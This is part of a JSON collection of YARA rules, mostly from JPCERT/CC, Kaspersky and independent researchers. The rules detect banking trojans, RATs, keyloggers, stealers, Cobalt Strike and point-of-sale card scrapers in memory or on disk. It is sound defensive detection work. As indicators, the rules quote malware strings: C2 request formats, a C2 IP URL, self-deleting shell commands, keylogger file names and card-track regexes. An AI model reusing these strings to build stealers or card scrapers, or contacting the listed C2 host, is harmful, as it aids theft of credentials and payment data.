  "shifu_shiz": "rule shifu_shiz {\n\tmeta:\n\t\tdescription = \"Memory string yara for Shifu/Shiz\"\n\t\tauthor = \"J from THL <j@techhelplist.com>\"\n\t\treference1 = \"https://researchcenter.paloaltonetworks.com/2017/01/unit42-2016-updates-shifu-banking-trojan/\"\n\t\treference2 = \"https://beta.virusbay.io/sample/browse/24a6dfaa98012a839658c143475a1e46\"\n    reference3 = \"https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/crime_shifu_trojan.yar\"\n\t\tdate = \"2018-03-16\"\n\t\tmaltype1 = \"Banker\"\n\t\tmaltype2 = \"Keylogger\"\n\t\tmaltype3 = \"Stealer\"\n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$aa = \"auth_loginByPassword\"\tfullword ascii\n\t\t$ab = \"back_command\"\tfullword ascii\n\t\t$ac = \"back_custom1\"\tfullword ascii\n\t\t$ad = \"GetClipboardData\"\tfullword ascii\n\t\t$ae = \"iexplore.exe|opera.exe|java.exe|javaw.exe|explorer.exe|isclient.exe|intpro.exe|ipc_full.exe\"\tfullword ascii\n\t\t$af = \"mnp.exe|cbsmain.dll|firefox.exe|clmain.exe|core.exe|maxthon.exe|avant.exe|safari.exe\"\tfullword ascii\n\t\t$ag = \"svchost.exe|chrome.exe|notepad.exe|rundll32.exe|netscape.exe|tbb-firefox.exe|frd.exe\"\tfullword ascii\n\t\t$ah = \"!inject\"\tfullword ascii\n\t\t$ai = \"!deactivebc\"\tfullword ascii\n\t\t$aj = \"!kill_os\"\tfullword ascii\n\t\t$ak = \"!load\"\tfullword ascii\n\t\t$al = \"!new_config\"\tfullword ascii\n\t\t$am = \"!activebc\"\tfullword ascii\n\t\t$an = \"keylog.txt\"\tfullword ascii\n\t\t$ao = \"keys_path.txt\"\tfullword ascii\n\t\t$ap = \"pass.log\"\tfullword ascii\n\t\t$aq = \"passwords.txt\"\tfullword ascii\n\t\t$ar = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"report\\\"\"\tfullword ascii\n\t\t$as = \"Content-Disposition: form-data; name=\\\"pcname\\\"\"\tfullword ascii\n\t\t$at = \"botid=%s&ver=\"\tfullword ascii\n\t\t$au = \"action=auth&np=&login=\"\tfullword ascii\n\t\t$av = \"&ctl00%24MainMenu%24Login1%24UserName=\"\tfullword ascii\n\t\t$aw = \"&cvv=\"\tfullword ascii\n\t\t$ax = \"&cvv2=\"\tfullword ascii\n\t\t$ay = \"&domain=\"\tfullword ascii\n\t\t$az = \"LOGIN_AUTHORIZATION_CODE=\"\tfullword ascii\n\t\t$ba = \"name=%s&port=%u\"\tfullword ascii\n\t\t$bb = \"PeekNamedPipe\"\tfullword ascii\n\t\t$bc = \"[pst]\"\tfullword ascii\n\t\t$bd = \"[ret]\"\tfullword ascii\n\t\t$be = \"[tab]\"\tfullword ascii\n\t\t$bf = \"[bks]\"\tfullword ascii\n\t\t$bg = \"[del]\"\tfullword ascii\n\t\t$bh = \"[ins]\"\tfullword ascii\n\t\t$bi = \"&up=%u&os=%03u&rights=%s&ltime=%s%d&token=%d&cn=\"\tfullword ascii\n\n\tcondition:\n\t\t18 of them\n}",
  "sitrof_fortis_scar": "rule sitrof_fortis_scar {\n\n    meta:\n        author = \"J from THL <j@techhelplist.com>\"\n        date = \"2018/23\"\n        reference1 = \"https://www.virustotal.com/#/file/59ab6cb69712d82f3e13973ecc7e7d2060914cea6238d338203a69bac95fd96c/community\"\n\treference2 = \"ETPRO rule 2806032, ETPRO TROJAN Win32.Scar.hhrw POST\"\n\tversion = 2\n        maltype = \"Stealer\"\n        filetype = \"memory\"\n\n    strings:\n\t\n\t$a = \"?get&version\"\n\t$b = \"?reg&ver=\"\n\t$c = \"?get&exe\"\n\t$d = \"?get&download\"\n\t$e = \"?get&module\"\n\t$f = \"&ver=\"\n\t$g = \"&comp=\"\n\t$h = \"&addinfo=\"\n\t$i = \"%s@%s; %s %s \\\"%s\\\" processor(s)\"\n\t$j = \"User-Agent: fortis\"\n\n    condition:\n        6 of them\n}",
  "viotto_keylogger": "rule viotto_keylogger\n{\nstrings:\n\t$hdr = \"MZ\"\n\t$s1 = \"Viotto Keylogger\"\n\t$s2 = \"msvbvm60\"\n\t$s3 = \"FtpPutFileA\"\n\t$s4 = \"VBA6\"\n\t$s5 = \"SetWindowsHookExA\"\ncondition:\n\t($hdr at 0) and all of ($s*)\n\n}",
  "xDedic_SysScan_unpacked": "rule xDedic_SysScan_unpacked : crimeware {\nmeta:\nauthor = \" Kaspersky Lab\"\nref = \"https://securelist.com/files/2016/06/xDedic_marketplace_ENG.pdf\"\nmaltype = \"crimeware\"\ntype =\"crimeware\"\nfiletype = \"Win32 EXE\"\ndate = \"2016-03-14\"\nversion = \"1.0\"\nhash = \"fac495be1c71012682ebb27092060b43\"\nhash = \"e8cc69231e209db7968397e8a244d104\"\nhash = \"a53847a51561a7e76fd034043b9aa36d\"\nhash = \"e8691fa5872c528cd8e72b82e7880e98\"\nhash = \"F661b50d45400e7052a2427919e2f777\"\nstrings:\n$a1=\"/c ping -n 2 127.0.0.1 & del \\\"SysScan.exe\\\"\" ascii wide\n$a2=\"SysScan DEBUG Mode!!!\" ascii wide\n$a3=\"This rechecking? (set 0/1 or press enter key)\" ascii wide\n$a4=\"http://37.49.224.144:8189/manual_result\" ascii wide\n$b1=\"Checker end work!\" ascii wide\n$b2=\"Trying send result...\" ascii wide\ncondition:\n((uint16(0) == 0x5A4D)) and (filesize < 5000000) and\n((any of ($a*)) or (all of ($b*)))\n}",
  "xdedic_packed_syscan": "rule xdedic_packed_syscan : crimeware {\nmeta:\nauthor = \"Kaspersky Lab\"\ncompany = \"Kaspersky Lab\"\nref = \"https://securelist.com/files/2016/06/xDedic_marketplace_ENG.pdf\"\nstrings:\n$a1 = \"SysScan.exe\" nocase ascii wide\ncondition:\nuint16(0) == 0x5A4D\nand any of ($a*) and filesize > 1000000 and filesize <1200000 and\npe.number_of_sections == 13 and pe.version_info[\"FileVersion\"] contains \"1.3.4.\"\n}",
  "TSCookie": "rule TSCookie {\n          meta:\n            description = \"detect TSCookie in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html\"\n            hash1 = \"6d2f5675630d0dae65a796ac624fb90f42f35fbe5dec2ec8f4adce5ebfaabf75\"\n\n          strings:\n            $v1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" wide\n            $b1 = { 68 D4 08 00 00 }\n\n          condition: all of them\n}",
  "TSC_Loader": "rule TSC_Loader {\n          meta:\n            description = \"detect TSCookie Loader in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" wide\n            $b1 = { 68 78 0B 00 00 }\n\n          condition: all of them\n}",
  "CobaltStrike": "rule CobaltStrike {\n          meta:\n            description = \"detect CobaltStrike Beacon in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html\"\n            hash1 = \"154db8746a9d0244146648006cc94f120390587e02677b97f044c25870d512c3\"\n            hash2 = \"f9b93c92ed50743cd004532ab379e3135197b6fb5341322975f4d7a98a0fcde7\"\n\n          strings:\n            $v1 = { 73 70 72 6E 67 00 }\n            $v2 = { 69 69 69 69 69 69 69 69 }\n\n          condition: all of them\n}",
  "RedLeaves": "rule RedLeaves {\n          meta:\n            description = \"detect RedLeaves in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory block scan\"\n            reference = \"https://blogs.jpcert.or.jp/en/2017/05/volatility-plugin-for-detecting-redleaves-malware.html\"\n            hash1 = \"5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481\"\n\n          strings:\n            $v1 = \"red_autumnal_leaves_dllmain.dll\"\n            $b1 = { FF FF 90 00 }\n\n          condition: $v1 and $b1 at 0\n}",
  "Himawari": "rule Himawari {\n          meta:\n            description = \"detect Himawari(a variant of RedLeaves) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://www.jpcert.or.jp/present/2018/JSAC2018_01_nakatsuru.pdf\"\n            hash1 = \"3938436ab73dcd10c495354546265d5498013a6d17d9c4f842507be26ea8fafb\"\n\n          strings:\n            $h1 = \"himawariA\"\n            $h2 = \"himawariB\"\n            $h3 = \"HimawariDemo\"\n\n          condition: all of them\n}",
  "Lavender": "rule Lavender {\n          meta:\n            description = \"detect Lavender(a variant of RedLeaves) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n            hash1 = \"db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d\"\n\n          strings:\n            $a1 = { C7 ?? ?? 4C 41 56 45 }\n            $a2 = { C7 ?? ?? 4E 44 45 52 }\n\n          condition: all of them\n}",
  "Armadill": "rule Armadill {\n          meta:\n            description = \"detect Armadill(a variant of RedLeaves) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $a1 = { C7 ?? ?? 41 72 6D 61 }\n            $a2 = { C7 ?? ?? 64 69 6C 6C }\n\n          condition: all of them\n}",
  "zark20rk": "rule zark20rk {\n          meta:\n            description = \"detect zark20rk(a variant of RedLeaves) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n            hash1 = \"d95ad7bbc15fdd112594584d92f0bff2c348f48c748c07930a2c4cc6502cd4b0\"\n\n          strings:\n            $a1 = { C7 ?? ?? 7A 61 72 6B }\n            $a2 = { C7 ?? ?? 32 30 72 6B }\n\n          condition: all of them\n}",
  "Ursnif": "rule Ursnif {\n          meta:\n            description = \"detect Ursnif(a.k.a. Dreambot, Gozi, ISFB) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n            hash1 = \"0207c06879fb4a2ddaffecc3a6713f2605cbdd90fc238da9845e88ff6aef3f85\"\n            hash2 = \"ff2aa9bd3b9b3525bae0832d1e2b7c6dfb988dc7add310088609872ad9a7e714\"\n            hash3 = \"1eca399763808be89d2e58e1b5e242324d60e16c0f3b5012b0070499ab482510\"\n\n          strings:\n            $a1 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n            $b1 = \"client.dll\" fullword\n            $c1 = \"version=%u\"\n            $c2 = \"user=%08x%08x%08x%08x\"\n            $c3 = \"server=%u\"\n            $c4 = \"id=%u\"\n            $c5 = \"crc=%u\"\n            $c6 = \"guid=%08x%08x%08x%08x\"\n            $c7 = \"name=%s\"\n            $c8 = \"soft=%u\"\n            $d1 = \"%s://%s%s\"\n            $d2 = \"PRI \\x2A HTTP/2.0\"\n            $e1 = { A1 ?? ?? ?? 00 35 E7 F7 8A 40 50 }\n            $e2 = { 56 56 56 6A 06 5? FF ?? ?? ?? ?? 00 }\n            $f1 = { 56 57 BE ?? ?? ?? ?? 8D ?? ?? A5 A5 A5 }\n            $f2 = { 35 8F E3 B7 3F }\n            $f3 = { 35 0A 60 2E 51 }\n\n         condition: $a1 or ($b1 and 3 of ($c*)) or (5 of ($c*)) or ($b1 and all of ($d*)) or all of ($e*) or all of ($f*)\n}",
  "Emotet": "rule Emotet {\n          meta:\n            description = \"detect Emotet in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v4a = { BB 00 C3 4C 84 }\n            $v4b = { B8 00 C3 CC 84 }\n            $v5a = { 69 01 6D 4E C6 41 05 39 30 00 00 }\n            $v5b = { 6D 4E C6 41 33 D2 81 C1 39 30 00 00 }\n\n          condition: ($v4a and $v4b) or $v5a or $v5b\n}",
  "SmokeLoader": "rule SmokeLoader {\n          meta:\n            description = \"detect SmokeLoader in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://www.cert.pl/en/news/single/dissecting-smoke-loader/\"\n\n          strings:\n            $a1 = { B8 25 30 38 58 }\n            $b1 = { 81 3D ?? ?? ?? ?? 25 00 41 00 }\n            $c1 = { C7 ?? ?? ?? 25 73 25 73 }\n\n          condition: $a1 and $b1 and $c1\n}",
  "Datper": "rule Datper {\n          meta:\n            description = \"detect Datper in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://blogs.jpcert.or.jp/en/2017/08/detecting-datper-malware-from-proxy-logs.html\"\n\n          strings:\n            $a1 = { E8 03 00 00 }\n            $b1 = \"|||\"\n            $c1 = \"Content-Type: application/x-www-form-urlencoded\"\n            $push7530h64 = { C7 C1 30 75 00 00 }\n            $push7530h = { 68 30 75 00 00 }\n\n          condition: $a1 and $b1 and $c1 and ($push7530h64 or $push7530h)\n}",
  "PlugX": "rule PlugX {\n          meta:\n            description = \"detect PlugX in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = { 47 55 4c 50 00 00 00 00 }\n            $v2a = { 68 40 25 00 00 }\n            $v2c = { 68 58 2D 00 00 }\n            $v2b = { 68 a0 02 00 00 }\n            $v2d = { 68 a4 36 00 00 }\n            $v2e = { 8D 46 10 68 }\n            $v2f = { 68 24 0D 00 00 }\n            $v2g = { 68 a0 02 00 00 }\n            $v2h = { 68 e4 0a 00 00 }\n            $enc1 = { C1 E? 03 C1 E? 07 2B ?? }\n            $enc2 = { 32 5? ?? 81 E? ?? ?? 00 00 2A 5? ?? 89 ?? ?? 32 ?? 2A ?? 32 5? ?? 2A 5? ?? 32 }\n            $enc3 = { B? 33 33 33 33 }\n            $enc4 = { B? 44 44 44 44 }\n         condition: $v1 at 0 or ($v2a and $v2b and $enc1) or ($v2c and $v2b and $enc1) or ($v2d and $v2b and $enc2) or ($v2d and $v2e and $enc2) or ($v2f and $v2g and $enc3 and $enc4) or ($v2h and $v2g and $enc3 and $enc4)\n}",
  "Ramnit": "rule Ramnit {\n          meta:\n            description = \"detect Ramnit\"\n            author = \"nazywam\"\n            module = \"ramnit\"\n            reference = \"https://www.cert.pl/en/news/single/ramnit-in-depth-analysis/\"\n\n          strings:\n            $guid = \"{%08X-%04X-%04X-%04X-%08X%04X}\"\n            $md5_magic_1 = \"15Bn99gT\"\n            $md5_magic_2 = \"1E4hNy1O\"\n            $init_dga = { C7 ?? ?? ?? ?? ?? FF FF FF FF FF ?? ?? ?? ?? ?? FF ?? ?? ?? ?? ?? FF ?? ?? ?? ?? ?? E8 ?? ?? ?? ?? 0B C0 75 ?? }\n            $xor_secret = { 8A ?? ?? 32 ?? 88 ?? 4? 4? E2 ?? }\n            $init_function = { FF 35 [4] 68 [4] 68 [2] 00 00 68 [4] E8 [4] FF 35 [4] 68 [4] 68 [2] 00 00 68 [4] E8 [4] FF 35 [4] 68 [4] 68 [2] 00 00 68 [4] E8 [4] FF 35 [4] 68 [4] 68 [2] 00 00 68 [4] E8 }\n            $dga_rand_int = { B9 1D F3 01 00 F7 F1 8B C8 B8 A7 41 00 00 }\n            $cookies = \"cookies4.dat\"\n            $s3 = \"pdatesDisableNotify\"\n            $get_domains = { a3 [4] a1 [4] 80 3? 00 75 ?? c7 05 [4] ff ff ff ff ff 35 [4] ff 35 [4] ff 35 [4] e8 }\n            $add_tld = { 55 8B EC  83 ?? ?? 57 C7 ?? ?? 00 00 00 00 B? ?? ?? ?? ?? 8B ?? ?? 3B ?? ?? 75 ?? 8B ?? }\n            $get_port = { 90 68 [4] 68 [4] FF 35 [4] FF 35 [4] E8 [4] 83 }\n\n          condition: $init_dga and $init_function and 2 of ($guid, $md5_magic_*, $cookies, $s3) and any of ( $get_port, $add_tld, $dga_rand_int, $get_domains, $xor_secret)\n}",
  "Hawkeye": "rule Hawkeye {\n          meta:\n            description = \"detect HawkEye in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $hawkstr1 = \"HawkEye Keylogger\" wide\n            $hawkstr2 = \"Dear HawkEye Customers!\" wide\n            $hawkstr3 = \"HawkEye Logger Details:\" wide\n\n          condition: all of them\n}",
  "Lokibot": "rule Lokibot {\n          meta:\n            description = \"detect Lokibot in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n            hash1 = \"6f12da360ee637a8eb075fb314e002e3833b52b155ad550811ee698b49f37e8c\"\n\n          strings:\n            $des3 = { 68 03 66 00 00 }\n            $param = \"MAC=%02X%02X%02XINSTALL=%08X%08X\"\n            $string = { 2d 00 75 00 00 00 46 75 63 6b 61 76 2e 72 75 00 00}\n\n          condition: all of them\n}",
  "Bebloh": "rule Bebloh {\n          meta:\n            description = \"detect Bebloh(a.k.a. URLZone) in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $crc32f = { b8 EE 56 0b ca }\n            $dga = \"qwertyuiopasdfghjklzxcvbnm123945678\"\n            $post1 = \"&vcmd=\"\n            $post2 = \"?tver=\"\n\n          condition: all of them\n}",
  "xxmm": "rule xxmm {\n          meta:\n            description = \"detect xxmm in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = \"setupParameter:\"\n            $v2 = \"loaderParameter:\"\n            $v3 = \"parameter:\"\n\n          condition: all of them\n}",
  "Azorult": "rule Azorult {\n          meta:\n            description = \"detect Azorult in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = \"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)\"\n            $v2 = \"http://ip-api.com/json\"\n            $v3 = { c6 07 1e c6 47 01 15 c6 47 02 34 }\n\n          condition: all of them\n}",
  "PoisonIvy": "rule PoisonIvy {\n           meta:\n            description = \"detect PoisonIvy in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $a1 = { 0E 89 02 44 }\n            $b1 = { AD D1 34 41 }\n            $c1 = { 66 35 20 83 66 81 F3 B8 ED }\n\n          condition: all of them\n}",
  "netwire": "rule netwire {\n           meta:\n            description = \"detect netwire in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = \"HostId-%Rand%\"\n            $v2 = \"mozsqlite3\"\n            $v3 = \"[Scroll Lock]\"\n            $v4 = \"GetRawInputData\"\n            $ping = \"ping 192.0.2.2\"\n            $log = \"[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\"\n\n          condition: ($v1) or ($v2 and $v3 and $v4) or ($ping and $log)\n}",
  "Nanocore": "rule Nanocore {\n          meta:\n            description = \"detect Nanocore in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $v1 = \"NanoCore Client\"\n            $v2 = \"PluginCommand\"\n            $v3 = \"CommandType\"\n\n          condition: all of them\n}",
  "Formbook": "rule Formbook {\n          meta:\n            description = \"detect Formbook in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $sqlite3step = { 68 34 1c 7b e1 }\n            $sqlite3text = { 68 38 2a 90 c5 }\n            $sqlite3blob = { 68 53 d8 7f 8c }\n\n          condition: all of them\n}",
  "Agenttesla_type1": "rule Agenttesla_type1 {\n          meta:\n            description = \"detect Agenttesla in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n\n          strings:\n            $iestr = \"C:\\\\\\\\Users\\\\\\\\Admin\\\\\\\\Desktop\\\\\\\\IELibrary\\\\\\\\IELibrary\\\\\\\\obj\\\\\\\\Debug\\\\\\\\IELibrary.pdb\"\n            $atstr = \"C:\\\\\\\\Users\\\\\\\\Admin\\\\\\\\Desktop\\\\\\\\ConsoleApp1\\\\\\\\ConsoleApp1\\\\\\\\obj\\\\\\\\Debug\\\\\\\\ConsoleApp1.pdb\"\n            $sqlitestr = \"Not a valid SQLite 3 Database File\" wide\n          condition: all of them\n}",
  "Agenttesla_type2": "rule Agenttesla_type2 {\n          meta:\n            description = \"detect Agenttesla in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"internal research\"\n            hash1 = \"670a00c65eb6f7c48c1e961068a1cb7fd3653bd29377161cd04bf15c9d010da2 \"\n\n          strings:\n            $type2db1 = \"1.85 (Hash, version 2, native byte-order)\" wide\n            $type2db2 = \"Unknow database format\" wide\n            $type2db3 = \"SQLite format 3\" wide\n          condition: all of them\n}",
  "Noderat": "rule Noderat {\n          meta:\n            description = \"detect Noderat in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            reference = \"https://blogs.jpcert.or.jp/ja/2019/02/tick-activity.html\"\n\n          strings:\n            $config = \"/config/app.json\"\n            $key = \"/config/.regeditKey.rc\"\n            $message = \"uninstall error when readFileSync: \"\n\n          condition: all of them\n}",
  "Njrat2": "rule Njrat2 {\n          meta:\n            description = \"detect njRAT in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            hash1 = \"d5f63213ce11798879520b0e9b0d1b68d55f7727758ec8c120e370699a41379d\"\n\n          strings:\n            $reg = \"SEE_MASK_NOZONECHECKS\" wide fullword\n            $msg = \"Execute ERROR\" wide fullword\n            $ping = \"cmd.exe /c ping 0 -n 2 & del\" wide fullword\n          condition: all of them\n}",
  "Trickbot": "rule Trickbot {\n          meta:\n            description = \"detect TrickBot in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            hash1 = \"2153be5c6f73f4816d90809febf4122a7b065cbfddaa4e2bf5935277341af34c\"\n\n          strings:\n            $tagm1 = \"<mcconf><ver>\" wide\n            $tagm2 = \"</autorun></mcconf>\" wide\n            $tagc1 = \"<moduleconfig><autostart>\" wide\n            $tagc2 = \"</autoconf></moduleconfig>\" wide\n            $tagi1 = \"<igroup><dinj>\" wide\n            $tagi2 = \"</dinj></igroup>\" wide\n            $tags1 = \"<servconf><expir>\" wide\n            $tags2 = \"</plugins></servconf>\" wide\n            $tagl1 = \"<slist><sinj>\" wide\n            $tagl2 = \"</sinj></slist>\" wide\n          condition: all of ($tagm*) or all of ($tagc*) or all of ($tagi*) or all of ($tags*) or all of ($tagl*)\n}",
  "Remcos": "rule Remcos {\n          meta:\n            description = \"detect Remcos in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            hash1 = \"7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5\"\n\n          strings:\n            $remcos = \"Remcos\" ascii fullword\n            $url = \"Breaking-Security.Net\" ascii fullword\n            $resource = \"SETTINGS\" wide fullword\n          condition:  all of them\n}",
  "Quasar": "rule Quasar {\n          meta:\n            description = \"detect Remcos in memory\"\n            author = \"JPCERT/CC Incident Response Group\"\n            rule_usage = \"memory scan\"\n            hash1 = \"390c1530ff62d8f4eddff0ac13bc264cbf4183e7e3d6accf8f721ffc5250e724\"\n\n          strings:\n            $quasarstr1 = \"Client.exe\" wide\n            $quasarstr2 = \"({0}:{1}:{2})\" wide\n            $class = { 52 00 65 00 73 00 6F 00 75 00 72 00 63 00 65 00 73 00 00 17 69 00 6E 00 66 00 6F 00 72 00 6D 00 61 00 74 00 69 00 6F 00 6E 00 00 80 }\n          condition: all of them\n}",
  "blackpos_v2": "rule blackpos_v2\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tversion = \"0.1\"\n\treference = \"http://blog.nuix.com/2014/09/08/blackpos-v2-new-variant-or-different-family\"\nstrings:\n\t$s1 = \"Usage: -[start|stop|install|uninstall\"\n\t$s2 = \"\\\\SYSTEM32\\\\sc.exe config LanmanWorkstation\"\n\t$s3 = \"t.bat\"\n\t$s4 = \"mcfmisvc\"\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "dump_tool": "rule dump_tool\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Related to pwdump6 and fgdump tools\"\nstrings:\n\t$s1 = \"lsremora\"\n\t$s2 = \"servpw\"\n\t$s3 = \"failed: %d\"\n\t$s4 = \"fgdump\"\n\t$s5 = \"fgexec\"\n\t$s6 = \"fgexecpipe\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "osql_tool": "rule osql_tool\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"O/I SQL - SQL query tool\"\n\tfiletype = \"EXE\"\n\tversion = \"0.1\"\n\tdate = \"1/30/2014\"\nstrings:\n\t$s1 = \"osql\\\\src\"\n\t$s2 = \"OSQLUSER\"\n\t$s3 = \"OSQLPASSWORD\"\n\t$s4 = \"OSQLSERVER\"\ncondition:\n\tuint16(0) == 0x5A4D and (all of ($s*))\n}",
  "misc_pos": "rule misc_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS Malware\"\nstrings:\n\t$s1 = \"KAPTOXA\"\n\t$s2 = \"cmd /c net start %s\"\n\t$s3 = \"pid:\"\n\t$s4 = \"%ADD%\"\n\t$s5 = \"COMSPEC\"\n\t$s6 = \"KARTOXA\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "unknown": "rule unknown\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Unknown POS\"\nstrings:\n\t$s1 = \"a.exe\" wide\n\t$s2 = \"Can anyone test\" wide\n\t$s3 = \"I m in computer class now\" wide\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "regex_pos": "rule regex_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS malware - Regex\"\nstrings:\n\t$n1 = \"REGEXEND\" nocase\n\t$n2 = \"RegExpr\" nocase\n\t$n3 = \"regex\"\n\t$s4 = \"[1-5][0-9]{14}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\n\t$s5 = \"[47][0-9]{13}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\n\t$s6 = \"(?:0[0-5]|[68][0-9])[0-9]{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\n\t$s7 = \"(?:011|5[0-9]{2})[0-9]{12}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\n\t$s8 = \"(?:2131|1800|35\\\\d{3})\\\\d{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\n\t$s9 = \"([0-9]{15,16}[D=](0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})\"\n\t$s10 = \"((b|B)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,30}\\\\/[A-Za-z\\\\s]{0,30}\\\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9\\\\s]{3,50}[0-9]{1})\"\n\t$s11 = \"[0-9]*\\\\^[a-zA-Z]*/[a-zA-Z ]*\\\\^[0-9]*\"\n\t$s12 = \"\\\\d{15,19}=\\\\d{13,}\"\n\t$s13 = \"\\\\;?[3-9]{1}[0-9]{12,19}[D=\\\\u0061][0-9]{10,30}\\\\??\"\n\t$s14 = \"[0-9]{12}(?:[0-9]{3})?=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*\"\ncondition:\n\tuint16(0) == 0x5A4D and 1 of ($n*) and 1 of ($s*)\n}",
  "regexpr_pos": "rule regexpr_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS malware - RegExpr\"\nstrings:\n\t$s1 = \"RegExpr\" nocase\n\t$s2 = \"Data.txt\"\n\t$s3 = \"Track1\"\n\t$s4 = \"Track2\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "reg_pos": "rule reg_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS malware - RegExpr\"\nstrings:\n\t$s1 = \"T1_FOUND: %s\"\n\t$s2 = \"id=%s&log=%s\"\n\t$s3 = \"\\\\d{15,19}=\\\\d{13,}\"\ncondition:\n\tuint16(0) == 0x5A4D and 2 of ($s*)\n}",
  "sets_pos": "rule sets_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS malware - Sets\"\nstrings:\n\t$s1 = \"GET /sets.txt\"\ncondition:\n\tuint16(0) == 0x5A4D and $s1\n}",
